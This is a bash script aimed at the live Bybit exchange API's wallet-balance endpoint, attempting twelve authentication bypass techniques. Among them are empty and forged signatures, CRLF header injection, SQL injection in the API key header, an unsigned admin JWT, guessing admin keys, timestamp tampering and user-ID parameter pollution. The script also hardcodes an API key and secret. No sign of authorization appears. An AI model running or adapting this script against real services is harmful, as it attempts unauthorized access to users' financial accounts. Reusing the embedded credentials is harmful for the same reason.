#!/bin/bash
# Testing ALL possible authentication bypass techniques

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
ENDPOINT="/v5/account/wallet-balance?accountType=UNIFIED"

echo "=========================================="
echo "AUTHENTICATION BYPASS - ALL METHODS"
echo "=========================================="

# Get server time
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"time":[0-9]*' | cut -d':' -f2)
TIMESTAMP=$SERVER_TIME

echo "Server time: $TIMESTAMP"

# Test 1: Empty signature
echo -e "\n[1] Testing with EMPTY signature"
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-SIGN: " \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" | head -1

# Test 2: Wrong signature
echo -e "\n[2] Testing with WRONG signature"
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-SIGN: wrongsignature123" \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" | head -1

# Test 3: Without signature header
echo -e "\n[3] Testing WITHOUT signature header"
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" | head -1

# Test 4: Case manipulation
echo -e "\n[4] Testing with LOWERCASE headers"
curl -s "$BASE$ENDPOINT" \
  -H "x-bapi-api-key: $API_KEY" \
  -H "x-bapi-sign: test" \
  -H "x-bapi-timestamp: $TIMESTAMP" | head -1

# Test 5: Header injection
echo -e "\n[5] Testing Header injection"
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-SIGN: test\r\nX-Admin: true" \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" | head -1

# Test 6: SQL injection in API key
echo -e "\n[6] Testing SQLi in API key"
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: ' OR '1'='1" \
  -H "X-BAPI-SIGN: test" \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" | head -1

# Test 7: Array injection
echo -e "\n[7] Testing array injection"
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY[]: $API_KEY" \
  -H "X-BAPI-API-KEY[]: admin" | head -1

# Test 8: JWT-style bypass
echo -e "\n[8] Testing JWT bypass"
curl -s "$BASE$ENDPOINT" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." | head -1

# Test 9: Admin API key guess
echo -e "\n[9] Testing common admin API keys"
for key in "admin" "test" "ADMIN" "00000000000000000000"; do
    response=$(curl -s "$BASE$ENDPOINT" -H "X-BAPI-API-KEY: $key")
    if ! echo "$response" | grep -q "10003"; then
        echo "  $key: Different error! $response"
    fi
done

# Test 10: Timestamp manipulation (future/past)
echo -e "\n[10] Testing timestamp manipulation"

# Far future
FUTURE_TIME=$((TIMESTAMP + 86400000))  # +1 day
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-TIMESTAMP: $FUTURE_TIME" | head -1

# Far past
PAST_TIME=$((TIMESTAMP - 86400000))  # -1 day
curl -s "$BASE$ENDPOINT" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-TIMESTAMP: $PAST_TIME" | head -1

# Test 11: Parameter pollution
echo -e "\n[11] Testing parameter pollution"
curl -s "$BASE$ENDPOINT&uid=1&uid=999999" \
  -H "X-BAPI-API-KEY: $API_KEY" | head -1

# Test 12: HTTP Method Override
echo -e "\n[12] Testing HTTP Method Override"
curl -s -X GET "$BASE$ENDPOINT" \
  -H "X-HTTP-Method-Override: POST" \
  -H "X-BAPI-API-KEY: $API_KEY" | head -1

echo -e "\n=========================================="
echo "BYPASS TESTING COMPLETE"
echo "=========================================="
